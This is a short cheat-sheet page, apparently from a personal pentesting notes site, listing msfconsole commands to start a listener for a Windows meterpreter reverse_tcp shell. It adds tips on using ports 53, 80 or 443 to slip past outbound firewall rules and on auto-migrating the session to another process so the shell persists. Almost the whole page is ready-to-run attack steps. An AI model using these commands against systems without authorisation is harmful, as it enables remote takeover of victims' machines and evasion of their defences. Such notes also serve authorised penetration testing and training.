---
title: "Metasploit Listener"
date: 2024-6-26
tags: ["metasploit", "listener", "revshell", "msfconsole"]
---

### Start a Metasploit Listener

<div>

```console
msfconsole -q
```

```console
use exploit/multi/handler
```

```console
set payload windows/meterpreter/reverse_tcp
```

```console
set lhost <LOCAL_IP>
```

```console
set lport <LOCAL_PORT>
```

```console
run
```

</div>

<small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>

### If the shell die immediately, we can try to migrate it to another process

<div>

```console
# Create a automigrate.rc script
run post/windows/manage/migrate
```

</div>

<br>

<div>

```console
msfconsole -q
```

```console
use exploit/multi/handler
```

```console
set payload windows/meterpreter/reverse_tcp
```

```console
set lhost <LOCAL_IP>
```

```console
set lport <LOCAL_PORT>
```

```console
set AutoRunScript multi_console_command -r automigrate.rc
```

```console
run
```

</div>

<br>